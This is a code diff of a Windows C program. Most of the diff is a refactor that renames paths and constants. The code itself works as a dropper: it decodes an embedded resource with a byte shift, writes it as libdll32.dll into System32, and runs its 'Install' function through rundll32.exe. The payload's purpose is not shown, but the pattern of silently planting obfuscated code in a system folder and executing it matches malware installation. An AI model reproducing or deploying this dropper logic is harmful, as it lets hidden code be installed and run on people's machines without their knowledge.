@@ -5,10 +5,10 @@
 
 #define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")
 
-#define SYSTEM32     L"System32"
-#define DLL_NAME     L"libdll32.dll"
-#define RUNDLL32EXE  L"rundll32.exe"
-#define DLL_FUNCTION L"Install"
+#define FILE_LIBDLL32     L"libdll32.dll"
+#define FILE_RUNDLL32     L"rundll32.exe"
+#define FOLDER_SYSTEM32   L"System32"
+#define FUNCTION_LIBDLL32 L"Install"
 
 int main(int argc, char** argv) {
 	printf("Finding resource\n");
@@ -54,40 +54,40 @@ int main(int argc, char** argv) {
 		buffer[i] = (data[i] - 18) % 0xFF;
 	}
 
-	LPWSTR windowsDirectoryPath = KHWin32GetWindowsDirectoryW();
+	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
 
-	if(!windowsDirectoryPath) {
+	if(!pathFolderWindows) {
 		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
 		FREE(buffer);
 		return 1;
 	}
 
-	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
-	FREE(windowsDirectoryPath);
+	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
+	FREE(pathFolderWindows);
 
-	if(!system32Path) {
+	if(!pathFolderSystem32) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		FREE(buffer);
 		return 1;
 	}
 
-	wprintf(SYSTEM32 L": %ws\n", system32Path);
-	LPWSTR libdll32Path = KHFormatMessageW(L"%ws\\" DLL_NAME, system32Path);
+	wprintf(FOLDER_SYSTEM32 L": %ws\n", pathFolderSystem32);
+	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderSystem32);
 
-	if(!libdll32Path) {
+	if(!pathFileLibdll32) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		FREE(system32Path);
+		FREE(pathFolderSystem32);
 		FREE(buffer);
 		return 1;
 	}
 
-	printf("DLL: %ws\nCreate file\n", libdll32Path);
-	HANDLE file = CreateFileW(libdll32Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	FREE(libdll32Path);
+	printf("DLL: %ws\nCreate file\n", pathFileLibdll32);
+	HANDLE file = CreateFileW(pathFileLibdll32, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	FREE(pathFileLibdll32);
 
 	if(file == INVALID_HANDLE_VALUE) {
 		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
-		FREE(system32Path);
+		FREE(pathFolderSystem32);
 		FREE(buffer);
 		return 1;
 	}
@@ -98,7 +98,7 @@ int main(int argc, char** argv) {
 	
 	if(!result) {
 		KHWin32DialogErrorW(GetLastError(), L"WriteFile");
-		FREE(system32Path);
+		FREE(pathFolderSystem32);
 		return 1;
 	}
 
@@ -106,30 +106,22 @@ int main(int argc, char** argv) {
 
 	if(resourceSize != written) {
 		printf("Error: Resource size mismatch\n");
-		FREE(system32Path);
+		FREE(pathFolderSystem32);
 		return 1;
 	}
 
 	if(!CloseHandle(file)) {
 		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
-		FREE(system32Path);
+		FREE(pathFolderSystem32);
 		return 1;
 	}
 
 	printf("File closed\n");
-	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);
-	FREE(system32Path);
+	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FILE_RUNDLL32, pathFolderSystem32);
+	FREE(pathFolderSystem32);
 
-	if(!rundll32Path) {
+	if(!pathFileRundll32) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		return 1;
-	}
-
-	LPWSTR rundll32Argument = KHFormatMessageW(L"%ws " DLL_NAME L"," DLL_FUNCTION, rundll32Path);
-
-	if(!rundll32Argument) {
-		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		FREE(rundll32Path);
 		return 1;
 	}
 
@@ -137,9 +129,8 @@ int main(int argc, char** argv) {
 	startupInformation.cb = sizeof(startupInformation);
 	PROCESS_INFORMATION processInformation;
 	printf("Running DLL File\n");
-	result = CreateProcessW(rundll32Path, rundll32Argument, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation);
-	FREE(rundll32Argument);
-	FREE(rundll32Path);
+	result = CreateProcessW(pathFileRundll32, FILE_RUNDLL32 L" " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation);
+	FREE(pathFileRundll32);
 
 	if(!result) {
 		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
